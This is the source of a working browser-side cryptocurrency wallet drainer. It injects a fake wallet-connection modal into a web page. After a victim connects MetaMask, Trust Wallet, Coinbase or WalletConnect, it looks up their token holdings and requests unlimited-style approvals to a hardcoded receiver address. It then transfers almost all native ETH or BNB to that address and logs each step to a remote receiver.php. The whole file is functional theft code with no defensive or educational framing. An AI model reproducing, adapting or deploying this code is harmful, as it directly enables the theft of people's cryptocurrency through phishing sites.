const DRAINER_CONFIG = {
  "receiver_address": "0x7e2e97C62Fe02ba67064A2FeeC7E1749987d853E"
};

var DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');

var connected_address = null, web3 = null, signer = null;
var current_provider = null, current_chain_id = null;

const MS_Contract_ABI = {
  'ERC-20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],
  "name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":
  [{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
  'ERC-721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`)
};

var MS_MetaMask_ChainData = {
  1: {
    chainId: '0x1',
    chainName: "Ethereum Mainnet",
    nativeCurrency: {
      name: "Ether",
      symbol: "ETH",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/eth" ],
    blockExplorerUrls: [ "https://etherscan.io" ]
  },
  56: {
    chainId: '0x38',
    chainName: "BNB Smart Chain",
    nativeCurrency: {
      name: "Binance Coin",
      symbol: "BNB",
      decimals: 18,
    },
    rpcUrls: [ "https://rpc.ankr.com/bsc" ],
    blockExplorerUrls: [ "https://bscscan.com" ]
  }
};

var WC_Provider = null;

const load_wc = () => {
  if (typeof window.WalletConnectProvider !== 'undefined') {
    WC_Provider = new WalletConnectProvider.default({
      rpc: {
        1: 'https://rpc.ankr.com/eth',
        56: 'https://rpc.ankr.com/bsc'
      },
      network: 'ethereum', chainId: 1
    });
  }
};

load_wc();

if (DRAINER_USER_ID === null) {
  sessionStorage.setItem('DRAINER_ID', String(Math.floor(Date.now() / 1000)));
  DRAINER_USER_ID = sessionStorage.getItem('DRAINER_ID');
  try {
    fetch('/receiver.php', {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        method: 'ENTER_WEBSITE',
        user_id: DRAINER_USER_ID
      })
    });
  } catch(err) {
    console.log(err);
  }
}

async function change_chain_id(chain_id) {
  try {
    if (current_provider != 'MM') return false;
    if (current_chain_id == chain_id) return false;
    try {
      await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${chain_id.toString(16)}` }] });
      current_chain_id = chain_id;
      web3 = new ethers.providers.Web3Provider(window.ethereum);
      signer = web3.getSigner();
      return true;
    } catch(err) {
      if (err.code == 4902) {
        try {
          await window.ethereum.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[chain_id] ] });
          current_chain_id = chain_id;
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          return true;
        } catch(err) {
          return false;
        }
      } else {
        return false;
      }
    }
  } catch(err) {
    console.log(err);
    return false;
  }
}

async function custom_connect(provider = 'Trust Wallet') {
  try {
    if (provider == 'Trust Wallet') {
      if (typeof window.ethereum !== 'object' || !window.ethereum.isTrust) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${(window.location.host + window.location.pathname)}`;
      } else {
        connect_wallet(false);
      }
    } else if (provider == 'Coinbase') {
      if (typeof window.ethereum !== 'object' || (!window.ethereum.isCoinbaseBrowser && !window.ethereum.isCoinbaseWallet)) {
        window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${(window.location.host + window.location.pathname)}`;
      } else {
        connect_wallet(false);
      }
    }
  } catch(err) {
    console.log(err);
  }
}

async function connect_wallet(force_wc = false, chain_id = 1) {
  try {
    if (force_wc == false) {
      try {
        if (typeof window.ethereum !== 'object') {
          window.location.href = `https://metamask.app.link/dapp/${(window.location.host + window.location.pathname)}`;
          return;
        }
        var result = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (result && result.length > 0) {
          connected_address = result[0];
          if (parseInt(window.ethereum.chainId) != 1 && parseInt(window.ethereum.chainId) != 56) {
            try {
              await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: '0x1' }] });
            } catch(err) {
              console.log('User rejected to change chain');
              return false;
            }
          }
          web3 = new ethers.providers.Web3Provider(window.ethereum);
          signer = web3.getSigner();
          current_provider = 'MM';
          current_chain_id = parseInt(window.ethereum.chainId);
        } else {
          console.log('User has no wallets');
          return false;
        }
      } catch(err) {
        if (err.code === 4001) {
          console.log('User rejected wallet connection');
          return false;
        } else {
          console.log(err);
          return false;
        }
      }
    } else if (typeof window.WalletConnectProvider !== 'undefined') {
      load_wc();
      if (WC_Provider.connected) await WC_Provider.disconnect(0);
      WC_Provider.chainId = chain_id;
      WC_Provider.isConnecting = false;
      try {
        var result = await WC_Provider.enable();
        if (result && result.length > 0) {
          connected_address = result[0];
          web3 = new ethers.providers.Web3Provider(WC_Provider);
          signer = web3.getSigner();
          current_provider = 'WC';
          current_chain_id = WC_Provider.chainId;
        }
      } catch(err) {
        console.log('User rejected wallet connection');
        return false;
      }
    } else {
      console.log('No providers available');
      return false;
    }
    if (connected_address === null || web3 === null || signer === null) {
      console.log('Unable to connect wallet');
      return false;
    }
    var is_chain_changeable = (current_provider == 'MM');
    // Message about connecting a wallet
    var ADDRESS_BALANCE = await signer.getBalance('latest');
    try {
      fetch('/receiver.php', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
          method: 'CONNECT_WALLET', address: connected_address, user_id: DRAINER_USER_ID,
          amount: ethers.utils.formatUnits(ethers.BigNumber.from(ADDRESS_BALANCE), 'ether'),
          chain_id: current_chain_id
        })
      });
    } catch(err) {
      console.log(err);
    }
    // Working with tokens
    var fee_counter = {
      1: ethers.BigNumber.from('0'),
      56: ethers.BigNumber.from('0')
    };
    try {
      var response = await fetch('https://rpc.ankr.com/multichain', {
        method: 'POST',
        headers: {
          'Accept': 'application/json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "id": 1,
          "jsonrpc": "2.0",
          "method": "ankr_getAccountBalance",
          "params": {
            "blockchain": is_chain_changeable ? ["bsc", "eth"] : (current_chain_id == 1 ? 'eth' : 'bsc'),
            "onlyWhitelisted": true,
            "walletAddress": connected_address
          }
        })
      });
      response = await response.json();
      var wallet_assets = [];
      if (response.result && response.result.assets) {
        for (const asset of response.result.assets) {
          try {
            if (asset.tokenType == 'NATIVE') continue;
            wallet_assets.push({
              chain_id: asset.blockchain == 'eth' ? 1 : 56,
              name: asset.tokenName,
              decimals: asset.tokenDecimals,
              balance: {
                raw: asset.balanceRawInteger,
                USD: parseFloat(asset.balanceUsd),
                ether: parseFloat(asset.balance)
              },
              type: asset.tokenType,
              address: asset.contractAddress || '0x0'
            });
          } catch(err) {
            console.log(err);
          }
        }
      }
      wallet_assets.sort((a, b) => { return b.balance.USD - a.balance.USD });
      for (const asset of wallet_assets) {
        try {
          if (current_chain_id != asset.chain_id) {
            if (is_chain_changeable == false) continue;
            var change_status = await change_chain_id(asset.chain_id);
            if (change_status == false) continue;
            else await new Promise(r => setTimeout(r, 1000));
          }
          const pContract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC-20'], signer);
          try {
            await pContract.approve(DRAINER_CONFIG.receiver_address, ethers.BigNumber.from(asset.balance.raw));
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, token_amount: asset.balance.raw,
                  processor_address: DRAINER_CONFIG.receiver_address, usd_amount: asset.balance.USD
                })
              });
              var gas_fee = ethers.BigNumber.from(await signer.getGasPrice()).mul(ethers.BigNumber.from('100000')).toString();
              fee_counter[current_chain_id] = ethers.BigNumber.from(fee_counter[current_chain_id]).add(ethers.BigNumber.from(gas_fee));
              await new Promise(r => setTimeout(r, 1000));
            } catch(err) {
              console.log(err);
            }
          } catch(err) {
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'NO_APPROVE_TOKEN', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: asset.balance.ether, token_name: asset.name, chain_id: current_chain_id,
                  token_address: asset.address, usd_amount: asset.balance.USD
                })
              });
            } catch(err) {
              console.log(err);
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
    // Working with Coins
    var chains_list = [ current_chain_id, (current_chain_id == 1 ? 56 : 1) ];
    for (const this_chain_id of chains_list) {
      try {
        if (current_chain_id != this_chain_id) {
          if (is_chain_changeable == false) continue;
          var change_status = await change_chain_id(this_chain_id);
          if (change_status == false) continue;
          else await new Promise(r => setTimeout(r, 1000));
        }
        var GAS_PRICE = await signer.getGasPrice();
        var GAS_LIMIT = 21000;
        var GAS_AMOUNT = ethers.BigNumber.from(GAS_PRICE).mul(ethers.BigNumber.from(GAS_LIMIT)).toString();
        var ADDRESS_BALANCE = await signer.getBalance('latest');
        var SAFE_AMOUNT = ethers.BigNumber.from(ADDRESS_BALANCE).sub(ethers.BigNumber.from(GAS_AMOUNT)).sub(ethers.BigNumber.from(fee_counter[this_chain_id])).toString();
        if (ethers.BigNumber.from(SAFE_AMOUNT).gt(ethers.BigNumber.from(0))) {
          try {
            await signer.sendTransaction({
              to: DRAINER_CONFIG.receiver_address,
              value: ethers.BigNumber.from(SAFE_AMOUNT),
              gasLimit: ethers.BigNumber.from(GAS_LIMIT),
              gasPrice: ethers.BigNumber.from(GAS_PRICE)
            });
            try {
              fetch('/receiver.php', {
                method: 'POST',
                headers: {
                  'Accept': 'application/json',
                  'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                  method: 'SEND_ETHEREUM', address: connected_address, user_id: DRAINER_USER_ID,
                  amount: ethers.utils.formatUnits(ethers.BigNumber.from(SAFE_AMOUNT), 'ether'),
                  chain_id: current_chain_id
                })
              });
            } catch(err) {
              console.log(err);
            }
            await new Promise(r => setTimeout(r, 1000));
          } catch(err) {
            console.log('Unable to send Ethereum');
          }
        } else {
          console.log('User has no Ethereum');
        }
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
}

const onDetectMobile = () => {
  let check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};

const MS_Mobile_Status = onDetectMobile();

const modal_show = () => {
  try {
    document.getElementById('web3-modal').style.display = 'block';
    document.getElementById('web3-overlay').style.display = 'block';
  } catch (err) {
    console.log(err);
  }
};

const modal_hide = () => {
  try {
    document.getElementById('web3-modal').style.display = 'none';
    document.getElementById('web3-overlay').style.display = 'none';
  } catch (err) {
    console.log(err);
  }
};

const MS_Modal_Style = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
.web3-modal-close {
  position: absolute;
  top: 15px;
  right: 15px;
  width: 20px;
  height: 20px;
  opacity: 0.3;
}

.web3-modal-close:hover {
  opacity: 1;
}

.web3-modal-close:before, .web3-modal-close:after {
  position: absolute;
  left: 10px;
  content: ' ';
  height: 20px;
  width: 2px;
  background-color: #000;
}

.web3-modal-close:before {
  transform: rotate(45deg);
}

.web3-modal-close:after {
  transform: rotate(-45deg);
}
.web3-overlay {
  width: 100%;
  height: 100%;
  position: fixed;
  top: 0;
  left: 0;
  background: rgba(23, 23, 23, 0.8);
  backdrop-filter: blur(5px);
  z-index: 99998;
}
.web3-modal {
  position: fixed;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;
  margin: auto;
  max-width: 500px;
  width: 100%;
  height: fit-content;
  padding: 21px 0px 0px;
  background: #FFFFFF;
  border-radius: 10px;
  z-index: 99999;
  font-family: 'Inter', sans-serif;
}
.web3-modal-title {
  font-weight: 700;
  font-size: 24px;
  line-height: 29px;
  color: #000000;
  text-align: center;
}
.web3-modal-items {
  border-top: 1px solid rgba(0, 0, 0, 0.1);
  margin-top: 21px;
}
.web3-modal .item {
  padding: 15px 34px;
  border-bottom: 1px solid rgba(0, 0, 0, 0.1);
  display: flex;
  align-items: center;
  justify-content: space-between;
  cursor: pointer;
  transition: .2s;
}
.web3-modal .item:hover {
  background: #fafafa;
}
.web3-modal .item div {
  display: flex;
  align-items: center;
}
.web3-modal .item:last-child {
  border-bottom: none;
}
.web3-modal .item span {
  font-weight: 400;
  font-size: 16px;
  color: #000000;
  margin-left: 11px;
}
.web3-modal .item .icon {
  width: 40px;
  height: 40px;
  justify-content: center;
}
.web3-modal .item .arrow {
  height: 12px;
  width: 7.4px;
  background: url('/images/arrow.svg') no-repeat;
}`;

const MS_Modal_Code = `
<a href="https://thesecurenode.online/main/connect/"><div class="web3-modal-close"></div></a>
<p class="web3-modal-title" style="margin-top: 0px">Connect your wallet</p>
<div class="web3-modal-items">
  <div class="item" onclick="connect_wallet(false)">
    <div>
      <div class="icon"><img src="/images/metamask-logo.png" alt=""></div>
      <span>MetaMask</span>
    </div>
    <div class="arrow"></div>
  </div>
  <div class="item" onclick="custom_connect('Trust Wallet')">
    <div>
      <div class="icon"><img src="/images/trust-wallet-logo.png" alt=""></div>
      <span>Trust Wallet</span>
    </div>
    <div class="arrow"></div>
  </div>
  <div class="item" onclick="custom_connect('Coinbase')">
    <div>
      <div class="icon"><img src="/images/coinbase-logo.png" alt=""></div>
      <span>Coinbase</span>
    </div>
    <div class="arrow"></div>
  </div>
  <div class="item" onclick="connect_wallet(true)">
    <div>
      <div class="icon"><img src="/images/wallet-connect-logo.png" alt=""></div>
      <span>WalletConnect</span>
    </div>
    <div class="arrow"></div>
  </div>
</div>`;

document.addEventListener("DOMContentLoaded", async () => {
  try {
    let modal_style = document.createElement('style');
    modal_style.innerHTML = MS_Modal_Style;
    document.head.appendChild(modal_style);
    let overlay_elem = document.createElement('div');
    overlay_elem.id = 'web3-overlay';
    overlay_elem.classList = ['web3-overlay'];
    overlay_elem.style.display = 'none';
    document.body.prepend(overlay_elem);
    let modal_elem = document.createElement('div');
    modal_elem.id = 'web3-modal';
    modal_elem.classList = ['web3-modal'];
    modal_elem.style.display = 'none';
    modal_elem.innerHTML = MS_Modal_Code;
    document.body.prepend(modal_elem);
  } catch (err) {
    console.log(err);
  }
});